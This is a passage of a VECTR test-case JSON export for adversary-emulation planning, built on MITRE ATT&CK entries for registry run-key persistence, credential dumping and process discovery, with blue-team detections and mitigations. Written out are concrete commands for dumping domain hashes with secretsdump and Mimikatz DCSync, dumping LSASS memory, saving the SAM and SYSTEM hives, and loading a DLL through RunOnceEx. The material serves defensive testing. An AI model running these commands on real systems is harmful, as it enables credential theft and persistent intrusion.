<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nThe <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.","command":"[APT39](https://attack.mitre.org/groups/G0087) has maintained persistence using the startup folder.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc","relationship--0574a456-6327-4f07-94b0-58be6ecbf8b8","relationship--9213f7ac-c548-4139-950b-5481a94570f9","course-of-action--8b36d944-f274-4d46-9acd-dbba6927ce7a","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018. https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key","Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014. http://msdn.microsoft.com/en-us/library/aa376977","Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018. https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/","Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016. https://technet.microsoft.com/en-us/sysinternals/bb963902"],"mitreId":"T1060"},"blueTeam":{"successfulDetectionBehaviors":["Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--d6dd145b-c7ae-4f79-bc07-179a012a7a07","vectrId":"d6dd145b-c7ae-4f79-bc07-179a012a7a07","name":"New","offset":0,"createTime":1.471180562E12,"updateTime":1.578425953534E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"d6dd145b-c7ae-4f79-bc07-179a012a7a07","icon":"icons/database.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Credential Dumping","variant":"Extract Password Hashes via Replication","objective":"Dump domain hashes for all domain users on the domain controller.","command":"Using impacket:\npython secretsdump.py -just-dc DOMAIN/USER:PASSWORD@<DC IP>\n\nMimikatz:\nlsadump::dcsync /domain:<domain> /user:<user>","likelihood":"Medium","risk":"High","internalExternal":"Internal","stealth":"High","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["e6217a43-ebc1-40ec-8ce0-245fcb8b7269","3883d65a-3ad2-4111-92fa-19a5d39a119d"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":[],"mitreId":"T1003"},"blueTeam":{"successfulDetectionBehaviors":[],"expectedDetectionLayerIds":["54c70ef6-1e4a-4613-a99d-692230cb557a"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) SIEM rules are configured to detect domain replication events from systems that are not domain controllers"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--d74a33c7-633e-449b-8eb8-c0d5c1d80e39","vectrId":"d74a33c7-633e-449b-8eb8-c0d5c1d80e39","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"d74a33c7-633e-449b-8eb8-c0d5c1d80e39","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Credential Dumping","variant":"APT39 - Credential Dumping - Mimikatz - Windows Credential Editor","objective":"Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\n### Windows\n\n#### SAM (Security Accounts Manager)\n\nThe SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid 501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\n#### Cached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using PBKDF2.\n\n#### Local Security Authority (LSA) Secrets\n\nWith SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.\n \nWhen services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.\nWindows 10 adds protections for LSA Secrets described in Mitigation.\n\n#### NTDS from Domain Controller\n\nActive Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)\n \nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\n#### Group Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"\n* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nNotes:\nOn the SYSVOL share, the following can be used to enumerate potential XML files.\ndir /s * .xml\n\n#### Service Principal Names (SPNs)\n\nSee [Kerberoasting](https://attack.mitre.org/techniques/T1208).\n\n#### Plaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.\n\nSSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.\n\nThe following SSPs can be used to access credentials:\n\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\nCredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)\n \nThe following tools can be used to enumerate credentials:\n\n* [Windows Credential Editor](https://attack.mitre.org/software/S0005)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n#### DCSync\n\nDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the \"lsadump\" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n\n### Linux\n\n#### Proc filesystem\n\nThe /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)\n---\n[Windows Credential Editor](https://attack.mitre.org/software/S0005) is a password dumping tool. (Citation: Amplia WCE)","command":"[APT39](https://attack.mitre.org/groups/G0087) has used Mimikatz, Ncrack, Windows Credential Editor and ProcDump to dump credentials.\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.\n---\nWindows:\nDo not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.\n\nLinux:\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive regions of memory.\n---\nLimit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.\n---\n\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication.\n---\nEnsure that local administrator accounts have complex, unique passwords across all systems on the network.\n---\n\nConsider disabling or restricting NTLM.\n---\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. It also does not protect against all forms of credential dumping.\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA, SAM table, credential vault, DCSync/NetSync, and DPAPI.\n---\n[Windows Credential Editor](https://attack.mitre.org/software/S0005) can dump credentials.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["d45db0db-f253-4b70-80e1-c12c07bf8313","3883d65a-3ad2-4111-92fa-19a5d39a119d"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22","relationship--948eaafc-3440-43f3-b9e4-39eb77197d72","relationship--a6f27258-cf6a-4d75-a3f0-5de085d528d2","course-of-action--72dade3e-1cba-4182-b3b3-a77ca52f02a1","relationship--a266294c-18a7-4a6e-8291-a901748c929c","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--ef79ec2f-fd7f-4f0b-851c-d215693987be","course-of-action--aeff5887-8f9e-48d5-a523-9b395e2ce80a","relationship--7e8ca453-aee5-48c1-a891-f44a742a95ed","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--fc31837d-530f-45e5-b9f8-bf6268c3ef03","course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462","relationship--7a3426bf-1751-43db-b844-6bf388a4c817","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","relationship--fe849763-78b9-4b8a-9219-2781ac7b00e8","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--ee8ef62a-fcde-44b0-aa63-4028dad703aa","course-of-action--49c06d54-9002-491d-9147-8efb537fbd26","tool--afc079f3-c0ea-4096-b75d-3f05338b7f60","relationship--b7930db8-2cb9-4ecf-b3d3-7425f99140d8","tool--242f3da3-4425-4d11-8f5c-b842886da966","relationship--935971d6-0af2-4683-971a-9acb523733fe","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Amplia Security. (n.d.). Windows Credentials Editor (WCE) F.A.Q.. Retrieved December 17, 2015. http://www.ampliasecurity.com/research/wcefaq.html","Campbell, C. (2012, May 24). GPP Password Retrieval with PowerShell. Retrieved April 11, 2018. https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html","Deply, B. (n.d.). Mimikatz. Retrieved September 29, 2015. https://github.com/gentilkiwi/mimikatz","Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017. https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump","Flathers, R. (2018, February 19). creddump7. Retrieved April 11, 2018. https://github.com/Neohapsis/creddump7","Frecn, D.. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019. https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea","Grafnetter, M. (2015, October 26). Retrieving DPAPI Backup Keys from Active Directory. Retrieved December 19, 2017. https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/","Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Lich, B. (2016, May 31). Protect derived domain credentials with Credential Guard. Retrieved June 1, 2016. https://technet.microsoft.com/en-us/itpro/windows/keep-secure/credential-guard","Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015. https://adsecurity.org/?page_id=1821","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017. https://adsecurity.org/?p=1729","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017. https://adsecurity.org/?p=1729","Microsoft. (2008, July 25). Credential Security Service Provider and SSO for Terminal Services Logon. Retrieved April 11, 2018. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749211(v=ws.10)","Microsoft. (2012, November 29). Using security policies to restrict NTLM traffic. Retrieved December 4, 2017. https://technet.microsoft.com/library/jj865668.aspx","Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved February 13, 2015. https://technet.microsoft.com/en-us/library/dn408187.aspx","Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017. https://msdn.microsoft.com/library/cc228086.aspx","Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017. https://msdn.microsoft.com/library/cc237008.aspx","Microsoft. (n.d.). 2.2.1.1.4 Password Encryption. Retrieved April 11, 2018. https://msdn.microsoft.com/library/cc422924.aspx","Microsoft. (n.d.). How to grant the \"Replicating Directory Changes\" permission for the Microsoft Metadirectory Services ADMA service account. Retrieved December 4, 2017. https://support.microsoft.com/help/303972/how-to-grant-the-replicating-directory-changes-permission-for-the-micr","Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017. https://msdn.microsoft.com/library/dd207691.aspx","Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017. https://msdn.microsoft.com/library/cc245496.aspx","NSA IAD. (2017, April 20). Secure Host Baseline - Credential Guard. Retrieved April 25, 2017. https://github.com/iadgov/Secure-Host-Baseline/tree/master/Credential%20Guard","Plett, C., Poggemeyer, L. (12, October 26). Securing Privileged Access Reference Material. Retrieved April 25, 2017. https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017. https://wiki.samba.org/index.php/DRSUAPI","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017. http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017. http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/","Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015. http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017. https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM","Wikipedia. (2018, March 10). Active Directory. Retrieved April 11, 2018. https://en.wikipedia.org/wiki/Active_Directory","Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018. https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/","Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017. https://source.winehq.org/WineAPI/samlib.html"],"mitreId":"T1003"},"blueTeam":{"successfulDetectionBehaviors":["Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","### Windows\nMonitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [Valid Accounts](https://attack.mitre.org/techniques/T1078) if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. (Citation: Microsoft Securing Privileged Access)\n\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA. (Citation: Microsoft LSA)\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. (Citation: TechNet Credential Guard) It also does not protect against all forms of credential dumping. (Citation: GitHub SHB Credential Guard)\n\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication. (Citation: AdSecurity DCSync Sept 2015) (Citation: Microsoft Replication ACL)\n\nConsider disabling or restricting NTLM traffic. (Citation: Microsoft Disable NTLM Nov 2012)\n\n### Linux\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to escalated privileges to avoid hostile programs from accessing such sensitive regions of memory.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc.","Set and enforce secure password policies for accounts.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--d96795c3-7a22-4876-8f98-5d32b02999b3","vectrId":"d96795c3-7a22-4876-8f98-5d32b02999b3","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"d96795c3-7a22-4876-8f98-5d32b02999b3","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Process Discovery","variant":"OilRig - Process Discovery - Tasklist","objective":"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nAn example command that would obtain details on processes is \"tasklist\" using the [Tasklist](https://attack.mitre.org/software/S0057) utility.\n\n### Mac and Linux\n\nIn Mac and Linux, this is accomplished with the <code>ps</code> command.\n---\nThe [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. (Citation: Microsoft Tasklist)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has run <code>tasklist</code> on a victim's machine.[Tasklist](https://attack.mitre.org/software/S0057) can be used to discover processes running on a system.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["f7ed4709-5abb-418a-b84b-8b947b41a96c"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580","relationship--d8e375a3-f455-4c66-bc63-251f320ec8b1","relationship--03f30a17-095b-4656-a7db-87d98628dfd8","course-of-action--f6469191-1814-4dbe-a081-2a6daf83a10b","tool--2e45723a-31da-4a7e-aaa6-e01998a6788f","relationship--32a470e7-4bbc-43e8-ae8e-09b382dd441f","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Microsoft. (n.d.). Tasklist. Retrieved December 23, 2015. https://technet.microsoft.com/en-us/library/bb491010.aspx"],"mitreId":"T1057"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs 